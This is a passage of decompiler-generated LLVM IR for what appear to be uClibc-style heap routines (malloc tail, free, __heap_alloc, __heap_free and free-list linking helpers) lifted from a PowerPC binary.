  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ef84

dec_label_pc_1000ef84:                            ; preds = %entry, %dec_label_pc_1000ef80
  %v0_1000ef94 = phi i32 [ 1, %dec_label_pc_1000ef80 ], [ %v0_1000ef68, %entry ]
  %v3_1000ef88 = icmp ugt i32 %v0_1000ef94, -8
  br i1 %v3_1000ef88, label %dec_label_pc_1000f098, label %dec_label_pc_1000ef90

dec_label_pc_1000ef90:                            ; preds = %dec_label_pc_1000ef84
  %v1_1000ef94 = add i32 %v0_1000ef94, 4
  store i32 ptrtoint (i32* @global_var_10031b88.761 to i32), i32* @r29, align 4
  store i32 %v1_1000ef94, i32* %stack_var_-40, align 4
  store i32 ptrtoint (i32* @global_var_10031b88.761 to i32), i32* %r3.global-to-local, align 4
  %v0_1000efa4 = call i32 @__pthread_return_0()
  %v2_1000efac = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18200), i32* %r3.global-to-local, align 4
  %v3_1000efb4 = call i32 @__heap_alloc(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18200) to i32*), i32 %v2_1000efac)
  store i32 %v3_1000efb4, i32* %r31.global-to-local, align 4
  %v0_1000efbc = load i32, i32* @r29, align 4
  store i32 %v0_1000efbc, i32* %r3.global-to-local, align 4
  %v0_1000efc0 = call i32 @__pthread_return_0()
  store i32 %v0_1000efc0, i32* %r3.global-to-local, align 4
  %v3_1000efc4 = icmp eq i32 %v3_1000efb4, 0
  br i1 %v3_1000efc4, label %dec_label_pc_1000efcc, label %dec_label_pc_1000f07c.thread

dec_label_pc_1000f07c.thread:                     ; preds = %dec_label_pc_1000ef90
  br label %dec_label_pc_1000f090

dec_label_pc_1000efcc:                            ; preds = %dec_label_pc_1000ef90
  %v3_1000efd0 = load i32, i32* @global_var_1002b948.764, align 4
  store i32 %v3_1000efd0, i32* %r31.global-to-local, align 4
  %v3_1000efd4 = load i32, i32* %stack_var_-40, align 4
  %v2_1000efd8 = icmp ult i32 %v3_1000efd4, %v3_1000efd0
  br i1 %v2_1000efd8, label %dec_label_pc_1000eff0, label %dec_label_pc_1000efe0

dec_label_pc_1000efe0:                            ; preds = %dec_label_pc_1000efcc
  %v1_1000efe4 = sub i32 0, %v3_1000efd0
  %v2_1000efe0 = add i32 %v3_1000efd0, -1
  %v1_1000efe8 = add i32 %v2_1000efe0, %v3_1000efd4
  %v2_1000efec = and i32 %v1_1000efe8, %v1_1000efe4
  store i32 %v2_1000efec, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000eff0

dec_label_pc_1000eff0:                            ; preds = %dec_label_pc_1000efcc, %dec_label_pc_1000efe0
  store i32 ptrtoint (i32* @global_var_10031c38.765 to i32), i32* %r3.global-to-local, align 4
  %v0_1000effc = call i32 @__pthread_return_0()
  %v0_1000f000 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1000f000, i32* %r3.global-to-local, align 4
  store i32 268496904, i32* @lr, align 4
  %v1_1000f004 = call i32 @__GI_sbrk(i32 %v0_1000f000)
  store i32 %v1_1000f004, i32* %r3.global-to-local, align 4
  %v3_1000f008 = icmp eq i32 %v1_1000f004, -1
  br i1 %v3_1000f008, label %dec_label_pc_1000f028, label %dec_label_pc_1000f010

dec_label_pc_1000f010:                            ; preds = %dec_label_pc_1000eff0
  %v1_1000f010 = add i32 %v1_1000f004, 3
  %v1_1000f014 = call i32 @__asm_rlwinm(i32 %v1_1000f010, i32 0, i32 0, i32 29)
  store i32 %v1_1000f014, i32* @r30, align 4
  %v4_1000f018 = icmp eq i32 %v1_1000f014, %v1_1000f004
  br i1 %v4_1000f018, label %dec_label_pc_1000f028, label %dec_label_pc_1000f020

dec_label_pc_1000f020:                            ; preds = %dec_label_pc_1000f010
  %v2_1000f020 = sub i32 %v1_1000f014, %v1_1000f004
  store i32 %v2_1000f020, i32* %r3.global-to-local, align 4
  store i32 268496936, i32* @lr, align 4
  %v1_1000f024 = call i32 @__GI_sbrk(i32 %v2_1000f020)
  store i32 %v1_1000f024, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f028

dec_label_pc_1000f028:                            ; preds = %dec_label_pc_1000f010, %dec_label_pc_1000eff0, %dec_label_pc_1000f020
  store i32 ptrtoint (i32* @global_var_10031c38.765 to i32), i32* %r3.global-to-local, align 4
  %v0_1000f030 = call i32 @__pthread_return_0()
  store i32 %v0_1000f030, i32* %r3.global-to-local, align 4
  %v0_1000f034 = load i32, i32* @r30, align 4
  %v3_1000f034 = icmp eq i32 %v0_1000f034, -1
  br i1 %v3_1000f034, label %dec_label_pc_1000f098, label %dec_label_pc_1000f07c

dec_label_pc_1000f07c:                            ; preds = %dec_label_pc_1000f028
  store i32 ptrtoint (i32* @global_var_10031b88.761 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002b8e8 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10031b88.761 to i32), i32* %r3.global-to-local, align 4
  %v0_1000f050 = call i32 @__pthread_return_0()
  %v0_1000f054 = load i32, i32* @r31, align 4
  %v0_1000f058 = load i32, i32* @r30, align 4
  %v0_1000f05c = load i32, i32* @r29, align 4
  store i32 %v0_1000f05c, i32* %r3.global-to-local, align 4
  store i32 268496996, i32* @lr, align 4
  %v3_1000f060 = inttoptr i32 %v0_1000f05c to i32*
  %v4_1000f060 = call i32 @__heap_free(i32* %v3_1000f060, i32 %v0_1000f058, i32 %v0_1000f054)
  %v0_1000f064 = load i32, i32* @r29, align 4
  store i32 %v0_1000f064, i32* %r3.global-to-local, align 4
  %v2_1000f06c = inttoptr i32 %v0_1000f064 to i32*
  %v3_1000f06c = call i32 @__heap_alloc(i32* %v2_1000f06c, i32 %v2_1000efac)
  store i32 %v3_1000f06c, i32* %r31.global-to-local, align 4
  %v0_1000f074 = load i32, i32* @r28, align 4
  store i32 %v0_1000f074, i32* %r3.global-to-local, align 4
  %v0_1000f078 = call i32 @__pthread_return_0()
  store i32 %v0_1000f078, i32* %r3.global-to-local, align 4
  %v3_1000f07c = icmp eq i32 %v3_1000f06c, 0
  br i1 %v3_1000f07c, label %dec_label_pc_1000f090.thread, label %dec_label_pc_1000f090

dec_label_pc_1000f090.thread:                     ; preds = %dec_label_pc_1000f07c
  br label %dec_label_pc_1000f098

dec_label_pc_1000f090:                            ; preds = %dec_label_pc_1000f07c, %dec_label_pc_1000f07c.thread
  %v0_1000f090.pr6 = phi i32 [ %v3_1000efb4, %dec_label_pc_1000f07c.thread ], [ %v3_1000f06c, %dec_label_pc_1000f07c ]
  %v3_1000f084 = load i32, i32* %stack_var_-40, align 4
  %v2_1000f088 = inttoptr i32 %v0_1000f090.pr6 to i32*
  store i32 %v3_1000f084, i32* %v2_1000f088, align 4
  %v0_1000f08c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000f08c = add i32 %v0_1000f08c, 4
  store i32 %v1_1000f08c, i32* @r31, align 4
  %v3_1000f090 = icmp eq i32 %v1_1000f08c, 0
  br i1 %v3_1000f090, label %dec_label_pc_1000f098, label %dec_label_pc_1000f0a8

dec_label_pc_1000f098:                            ; preds = %dec_label_pc_1000f090.thread, %dec_label_pc_1000f090, %dec_label_pc_1000f028, %dec_label_pc_1000ef84
  %v0_1000f098 = call i32 @__errno_location()
  store i32 %v0_1000f098, i32* %r3.global-to-local, align 4
  %v2_1000f0a0 = inttoptr i32 %v0_1000f098 to i32*
  store i32 12, i32* %v2_1000f0a0, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000f0a8

dec_label_pc_1000f0a8:                            ; preds = %dec_label_pc_1000f090, %dec_label_pc_1000f098
  %v0_1000f0ac = phi i32 [ %v1_1000f08c, %dec_label_pc_1000f090 ], [ 0, %dec_label_pc_1000f098 ]
  store i32 %v0_1000f0ac, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f0ac

; uselistorder directives
  uselistorder i32 %v0_1000f0ac, { 1, 0 }
  uselistorder i32 %v1_1000f08c, { 1, 0, 2 }
  uselistorder i32 %v1_1000f014, { 1, 0, 2 }
  uselistorder i32 %v1_1000f004, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_1000efd0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000efb4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 8, 6, 7, 9, 11, 10, 12, 2, 13, 3, 14, 4, 16, 15, 5, 17, 18, 19, 20, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10031b88.761 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000f0a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f098, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f028, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000eff0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef84, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000f0c0 = icmp eq i32 %arg1, 0
  br i1 %v3_1000f0c0, label %dec_label_pc_1000f1ac, label %dec_label_pc_1000f0d8

dec_label_pc_1000f0d8:                            ; preds = %entry
  %v1_1000f0dc = add i32 %arg1, -4
  %v2_1000f0dc = inttoptr i32 %v1_1000f0dc to i32*
  %v3_1000f0dc = load i32, i32* %v2_1000f0dc, align 4
  store i32 %v3_1000f0dc, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r26, align 4
  %v0_1000f0f0 = call i32 @__pthread_return_0()
  %v0_1000f0f8 = load i32, i32* @r28, align 4
  store i32 268497156, i32* @lr, align 4
  %v4_1000f100 = call i32 @__heap_free(i32* nonnull @global_var_1002b8e8, i32 %v1_1000f0dc, i32 %v0_1000f0f8)
  %v3_1000f108 = load i32, i32* @global_var_1002b948.764, align 4
  store i32 %v4_1000f100, i32* @r29, align 4
  %v1_1000f110 = inttoptr i32 %v4_1000f100 to i32*
  %v2_1000f110 = load i32, i32* %v1_1000f110, align 4
  store i32 %v2_1000f110, i32* @r27, align 4
  %v1_1000f114 = mul i32 %v3_1000f108, 8
  %v2_1000f118 = icmp ult i32 %v2_1000f110, %v1_1000f114
  br i1 %v2_1000f118, label %dec_label_pc_1000f14c, label %dec_label_pc_1000f120

dec_label_pc_1000f120:                            ; preds = %dec_label_pc_1000f0d8
  store i32 ptrtoint (i32* @global_var_10031c38.765 to i32), i32* @r28, align 4
  %v0_1000f130 = call i32 @__pthread_return_0()
  store i32 268497212, i32* @lr, align 4
  %v1_1000f138 = call i32 @__GI_sbrk(i32 0)
  %v0_1000f13c = load i32, i32* @r31, align 4
  %v4_1000f13c = icmp eq i32 %v0_1000f13c, %v1_1000f138
  br i1 %v4_1000f13c, label %dec_label_pc_1000f154, label %dec_label_pc_1000f144

dec_label_pc_1000f144:                            ; preds = %dec_label_pc_1000f120
  %v0_1000f148 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000f14c

dec_label_pc_1000f14c:                            ; preds = %dec_label_pc_1000f0d8, %dec_label_pc_1000f144
  br label %dec_label_pc_1000f1a8

dec_label_pc_1000f154:                            ; preds = %dec_label_pc_1000f120
  %v0_1000f154 = load i32, i32* @r29, align 4
  %v1_1000f154 = add i32 %v0_1000f154, 4
  %v2_1000f154 = inttoptr i32 %v1_1000f154 to i32*
  %v3_1000f154 = load i32, i32* %v2_1000f154, align 4
  %v3_1000f158 = icmp eq i32 %v3_1000f154, 0
  br i1 %v3_1000f158, label %dec_label_pc_1000f168, label %dec_label_pc_1000f160

dec_label_pc_1000f160:                            ; preds = %dec_label_pc_1000f154
  %v1_1000f160 = add i32 %v0_1000f154, 8
  %v2_1000f160 = inttoptr i32 %v1_1000f160 to i32*
  %v3_1000f160 = load i32, i32* %v2_1000f160, align 4
  %v2_1000f164 = add i32 %v3_1000f154, 8
  %v3_1000f164 = inttoptr i32 %v2_1000f164 to i32*
  store i32 %v3_1000f160, i32* %v3_1000f164, align 4
  %v0_1000f168.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000f168

dec_label_pc_1000f168:                            ; preds = %dec_label_pc_1000f154, %dec_label_pc_1000f160
  %v0_1000f168 = phi i32 [ %v0_1000f154, %dec_label_pc_1000f154 ], [ %v0_1000f168.pre, %dec_label_pc_1000f160 ]
  %v1_1000f168 = add i32 %v0_1000f168, 8
  %v2_1000f168 = inttoptr i32 %v1_1000f168 to i32*
  %v3_1000f168 = load i32, i32* %v2_1000f168, align 4
  %v1_1000f16c = add i32 %v0_1000f168, 4
  %v2_1000f16c = inttoptr i32 %v1_1000f16c to i32*
  %v3_1000f16c = load i32, i32* %v2_1000f16c, align 4
  %v3_1000f170 = icmp eq i32 %v3_1000f168, 0
  br i1 %v3_1000f170, label %dec_label_pc_1000f180, label %dec_label_pc_1000f178

dec_label_pc_1000f178:                            ; preds = %dec_label_pc_1000f168
  %v2_1000f178 = add i32 %v3_1000f168, 4
  %v3_1000f178 = inttoptr i32 %v2_1000f178 to i32*
  store i32 %v3_1000f16c, i32* %v3_1000f178, align 4
  br label %dec_label_pc_1000f184

dec_label_pc_1000f180:                            ; preds = %dec_label_pc_1000f168
  store i32 %v3_1000f16c, i32* @global_var_1002b8e8, align 4
  br label %dec_label_pc_1000f184

dec_label_pc_1000f184:                            ; preds = %dec_label_pc_1000f178, %dec_label_pc_1000f180
  %v0_1000f18c = call i32 @__pthread_return_0()
  %v0_1000f190 = load i32, i32* @r27, align 4
  %v1_1000f190 = load i32, i32* @r29, align 4
  %v0_1000f198 = load i32, i32* @r31, align 4
  %v2_1000f190 = sub i32 12, %v0_1000f190
  %v1_1000f194 = add i32 %v2_1000f190, %v1_1000f190
  %v2_1000f198 = sub i32 %v1_1000f194, %v0_1000f198
  store i32 268497312, i32* @lr, align 4
  %v1_1000f19c = call i32 @__GI_sbrk(i32 %v2_1000f198)
  br label %dec_label_pc_1000f1a8

dec_label_pc_1000f1a8:                            ; preds = %dec_label_pc_1000f14c, %dec_label_pc_1000f184
  %v0_1000f1a8 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000f1ac

dec_label_pc_1000f1ac:                            ; preds = %entry, %dec_label_pc_1000f1a8
  %v0_1000f1bc = phi i32 [ 0, %entry ], [ %v0_1000f1a8, %dec_label_pc_1000f1a8 ]
  ret i32 %v0_1000f1bc

; uselistorder directives
  uselistorder i32 %v0_1000f168, { 1, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 3, 2 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 1, 0 }
  uselistorder i32* @global_var_1002b8e8, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f184, { 1, 0 }
  uselistorder label %dec_label_pc_1000f168, { 1, 0 }
  uselistorder label %dec_label_pc_1000f14c, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_1000f1c0 = inttoptr i32 %arg2 to i32*
  %v2_1000f1c0 = load i32, i32* %v1_1000f1c0, align 4
  %v1_1000f1c4 = add i32 %v2_1000f1c0, 3
  store i32 %v1_1000f1c4, i32* %r9.global-to-local, align 4
  %v1_1000f1c8 = call i32 @__asm_rlwinm(i32 %v1_1000f1c4, i32 0, i32 0, i32 29)
  %v2_1000f1cc = icmp ugt i32 %v1_1000f1c8, 11
  br i1 %v2_1000f1cc, label %dec_label_pc_1000f250.preheader, label %dec_label_pc_1000f1d4

dec_label_pc_1000f1d4:                            ; preds = %entry
  br label %dec_label_pc_1000f250.preheader

dec_label_pc_1000f250.preheader:                  ; preds = %entry, %dec_label_pc_1000f1d4
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000f1d4 ], [ %v1_1000f1c8, %entry ]
  %v0_1000f234 = phi i32 [ 12, %dec_label_pc_1000f1d4 ], [ %v1_1000f1c8, %entry ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_1000f2505 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000f2505, label %dec_label_pc_1000f258, label %dec_label_pc_1000f1e0

dec_label_pc_1000f1e0:                            ; preds = %dec_label_pc_1000f250.preheader, %dec_label_pc_1000f24c
  %v0_1000f24c = phi i32 [ %storemerge, %dec_label_pc_1000f24c ], [ %storemerge2, %dec_label_pc_1000f250.preheader ]
  %v1_1000f1e0 = inttoptr i32 %v0_1000f24c to i32*
  %v2_1000f1e0 = load i32, i32* %v1_1000f1e0, align 4
  store i32 %v2_1000f1e0, i32* %r10.global-to-local, align 4
  %v2_1000f1e4 = icmp ult i32 %v2_1000f1e0, %v0_1000f234
  br i1 %v2_1000f1e4, label %dec_label_pc_1000f24c, label %dec_label_pc_1000f1ec

dec_label_pc_1000f1ec:                            ; preds = %dec_label_pc_1000f1e0
  %v1_1000f1ec = add i32 %v0_1000f234, 44
  %v2_1000f1f0 = icmp ult i32 %v2_1000f1e0, %v1_1000f1ec
  br i1 %v2_1000f1f0, label %dec_label_pc_1000f1f8, label %dec_label_pc_1000f234

dec_label_pc_1000f1f8:                            ; preds = %dec_label_pc_1000f1ec
  %v1_1000f1f8 = add i32 %v0_1000f24c, 4
  %v2_1000f1f8 = inttoptr i32 %v1_1000f1f8 to i32*
  %v3_1000f1f8 = load i32, i32* %v2_1000f1f8, align 4
  store i32 %v3_1000f1f8, i32* %r11.global-to-local, align 4
  %v3_1000f1fc = icmp eq i32 %v3_1000f1f8, 0
  br i1 %v3_1000f1fc, label %dec_label_pc_1000f20c, label %dec_label_pc_1000f204

dec_label_pc_1000f204:                            ; preds = %dec_label_pc_1000f1f8
  %v1_1000f204 = add i32 %v0_1000f24c, 8
  %v2_1000f204 = inttoptr i32 %v1_1000f204 to i32*
  %v3_1000f204 = load i32, i32* %v2_1000f204, align 4
  %v2_1000f208 = add i32 %v3_1000f1f8, 8
  %v3_1000f208 = inttoptr i32 %v2_1000f208 to i32*
  store i32 %v3_1000f204, i32* %v3_1000f208, align 4
  %v0_1000f20c.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000f228.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000f20c

dec_label_pc_1000f20c:                            ; preds = %dec_label_pc_1000f1f8, %dec_label_pc_1000f204
  %v0_1000f228 = phi i32 [ %v2_1000f1e0, %dec_label_pc_1000f1f8 ], [ %v0_1000f228.pre, %dec_label_pc_1000f204 ]
  %v0_1000f20c = phi i32 [ %v0_1000f24c, %dec_label_pc_1000f1f8 ], [ %v0_1000f20c.pre, %dec_label_pc_1000f204 ]
  %v1_1000f20c = add i32 %v0_1000f20c, 8
  %v2_1000f20c = inttoptr i32 %v1_1000f20c to i32*
  %v3_1000f20c = load i32, i32* %v2_1000f20c, align 4
  %v1_1000f210 = add i32 %v0_1000f20c, 4
  %v2_1000f210 = inttoptr i32 %v1_1000f210 to i32*
  %v3_1000f210 = load i32, i32* %v2_1000f210, align 4
  %v3_1000f214 = icmp eq i32 %v3_1000f20c, 0
  store i32 %v0_1000f228, i32* %r11.global-to-local, align 4
  br i1 %v3_1000f214, label %dec_label_pc_1000f228, label %dec_label_pc_1000f21c

dec_label_pc_1000f21c:                            ; preds = %dec_label_pc_1000f20c
  %v2_1000f220 = add i32 %v3_1000f20c, 4
  %v3_1000f220 = inttoptr i32 %v2_1000f220 to i32*
  store i32 %v3_1000f210, i32* %v3_1000f220, align 4
  br label %dec_label_pc_1000f23c

dec_label_pc_1000f228:                            ; preds = %dec_label_pc_1000f20c
  store i32 %v3_1000f210, i32* %arg1, align 4
  br label %dec_label_pc_1000f23c

dec_label_pc_1000f234:                            ; preds = %dec_label_pc_1000f1ec
  %v2_1000f234 = sub i32 %v2_1000f1e0, %v0_1000f234
  store i32 %v2_1000f234, i32* %v1_1000f1e0, align 4
  br label %dec_label_pc_1000f23c

dec_label_pc_1000f23c:                            ; preds = %dec_label_pc_1000f228, %dec_label_pc_1000f21c, %dec_label_pc_1000f234
  %v0_1000f23c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f23c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f23c = sub i32 %v1_1000f23c, %v0_1000f23c
  store i32 %v2_1000f23c, i32* %r9.global-to-local, align 4
  %v0_1000f240 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000f240, i32* %v1_1000f1c0, align 4
  %v0_1000f244 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f244 = add i32 %v0_1000f244, 12
  ret i32 %v1_1000f244

dec_label_pc_1000f24c:                            ; preds = %dec_label_pc_1000f1e0
  %v1_1000f24c = add i32 %v0_1000f24c, 4
  %storemerge.in = inttoptr i32 %v1_1000f24c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_1000f250 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000f250, label %dec_label_pc_1000f250.dec_label_pc_1000f258_crit_edge, label %dec_label_pc_1000f1e0

dec_label_pc_1000f250.dec_label_pc_1000f258_crit_edge: ; preds = %dec_label_pc_1000f24c
  br label %dec_label_pc_1000f258

dec_label_pc_1000f258:                            ; preds = %dec_label_pc_1000f250.dec_label_pc_1000f258_crit_edge, %dec_label_pc_1000f250.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000f20c, { 1, 0 }
  uselistorder i32 %v2_1000f1e0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000f24c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000f234, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 2, 1, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000f23c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f20c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f250.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000f260 = icmp eq i32 %arg3, 0
  %v2_1000f264 = add i32 %arg2, 4
  %v3_1000f264 = inttoptr i32 %v2_1000f264 to i32*
  store i32 %arg4, i32* %v3_1000f264, align 4
  %v2_1000f268 = add i32 %arg2, 8
  %v3_1000f268 = inttoptr i32 %v2_1000f268 to i32*
  store i32 %arg3, i32* %v3_1000f268, align 4
  br i1 %v3_1000f260, label %dec_label_pc_1000f278, label %dec_label_pc_1000f270

dec_label_pc_1000f270:                            ; preds = %entry
  %v2_1000f270 = add i32 %arg3, 4
  %v3_1000f270 = inttoptr i32 %v2_1000f270 to i32*
  store i32 %arg2, i32* %v3_1000f270, align 4
  br label %dec_label_pc_1000f27c

dec_label_pc_1000f278:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000f27c

dec_label_pc_1000f27c:                            ; preds = %dec_label_pc_1000f270, %dec_label_pc_1000f278
  %v3_1000f27c = icmp eq i32 %arg4, 0
  %v0_1000f280 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f27c, i32 %v0_1000f280)
  %v2_1000f284 = add i32 %arg4, 8
  %v3_1000f284 = inttoptr i32 %v2_1000f284 to i32*
  store i32 %arg2, i32* %v3_1000f284, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 3, 0, 1, 4, 2 }
  uselistorder label %dec_label_pc_1000f27c, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000f28c = icmp eq i32 %arg3, 0
  br i1 %v3_1000f28c, label %dec_label_pc_1000f29c, label %dec_label_pc_1000f294

dec_label_pc_1000f294:                            ; preds = %entry
  %v2_1000f294 = add i32 %arg3, 4
  %v3_1000f294 = inttoptr i32 %v2_1000f294 to i32*
  store i32 %arg2, i32* %v3_1000f294, align 4
  br label %dec_label_pc_1000f2a0

dec_label_pc_1000f29c:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000f2a0

dec_label_pc_1000f2a0:                            ; preds = %dec_label_pc_1000f294, %dec_label_pc_1000f29c
  %v2_1000f2a0 = add i32 %arg2, 8
  %v3_1000f2a0 = inttoptr i32 %v2_1000f2a0 to i32*
  store i32 %arg3, i32* %v3_1000f2a0, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000f2a0, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000f2c0 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f2c0, i32* @r31, align 4
  %v2_1000f2c4 = add i32 %arg3, %arg2
  store i32 %v2_1000f2c4, i32* %r3.global-to-local, align 4
  %v3_1000f2d87 = icmp eq i32 %v2_1000f2c0, 0
  %v1_1000f2dc8 = add i32 %v2_1000f2c0, 12
  %tmp69 = icmp uge i32 %v1_1000f2dc8, %arg2
  %or.cond10 = or i1 %v3_1000f2d87, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000f2e8, label %dec_label_pc_1000f2d0

dec_label_pc_1000f2d0:                            ; preds = %entry, %dec_label_pc_1000f2d0
  %v0_1000f33011 = phi i32 [ %v3_1000f2d4, %dec_label_pc_1000f2d0 ], [ %v2_1000f2c0, %entry ]
  store i32 %v0_1000f33011, i32* %r11.global-to-local, align 4
  %v1_1000f2d4 = add i32 %v0_1000f33011, 4
  %v2_1000f2d4 = inttoptr i32 %v1_1000f2d4 to i32*
  %v3_1000f2d4 = load i32, i32* %v2_1000f2d4, align 4
  store i32 %v3_1000f2d4, i32* @r31, align 4
  %v3_1000f2d8 = icmp eq i32 %v3_1000f2d4, 0
  %v1_1000f2dc = add i32 %v3_1000f2d4, 12
  %tmp6 = icmp uge i32 %v1_1000f2dc, %arg2
  %or.cond = or i1 %v3_1000f2d8, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000f2e8, label %dec_label_pc_1000f2d0

dec_label_pc_1000f2e8:                            ; preds = %dec_label_pc_1000f2d0, %entry
  %v0_1000f324.lcssa = phi i32 [ 0, %entry ], [ %v0_1000f33011, %dec_label_pc_1000f2d0 ]
  %v0_1000f330.lcssa = phi i32 [ %v2_1000f2c0, %entry ], [ %v3_1000f2d4, %dec_label_pc_1000f2d0 ]
  %v3_1000f2d8.lcssa = phi i1 [ %v3_1000f2d87, %entry ], [ %v3_1000f2d8, %dec_label_pc_1000f2d0 ]
  br i1 %v3_1000f2d8.lcssa, label %dec_label_pc_1000f3a0, label %dec_label_pc_1000f2f0

dec_label_pc_1000f2f0:                            ; preds = %dec_label_pc_1000f2e8
  %v1_1000f2f0 = inttoptr i32 %v0_1000f330.lcssa to i32*
  %v2_1000f2f0 = load i32, i32* %v1_1000f2f0, align 4
  %v2_1000f2f4 = sub i32 %v0_1000f330.lcssa, %v2_1000f2f0
  %v1_1000f2f8 = add i32 %v2_1000f2f4, 12
  %v3_1000f2fc = icmp ugt i32 %v1_1000f2f8, %v2_1000f2c4
  br i1 %v3_1000f2fc, label %dec_label_pc_1000f3a0, label %dec_label_pc_1000f304

dec_label_pc_1000f304:                            ; preds = %dec_label_pc_1000f2f0
  %v4_1000f2fc = icmp eq i32 %v1_1000f2f8, %v2_1000f2c4
  %v2_1000f308 = add i32 %v2_1000f2f0, %arg3
  store i32 %v2_1000f308, i32* @r29, align 4
  br i1 %v4_1000f2fc, label %dec_label_pc_1000f310, label %dec_label_pc_1000f340

dec_label_pc_1000f310:                            ; preds = %dec_label_pc_1000f304
  %v3_1000f310 = icmp eq i32 %v0_1000f324.lcssa, 0
  br i1 %v3_1000f310, label %dec_label_pc_1000f394, label %dec_label_pc_1000f318

dec_label_pc_1000f318:                            ; preds = %dec_label_pc_1000f310
  %v1_1000f318 = add i32 %v0_1000f324.lcssa, 12
  %v4_1000f31c = icmp eq i32 %v1_1000f318, %arg2
  br i1 %v4_1000f31c, label %dec_label_pc_1000f324, label %dec_label_pc_1000f394

dec_label_pc_1000f324:                            ; preds = %dec_label_pc_1000f318
  %v1_1000f324 = inttoptr i32 %v0_1000f324.lcssa to i32*
  %v2_1000f324 = load i32, i32* %v1_1000f324, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
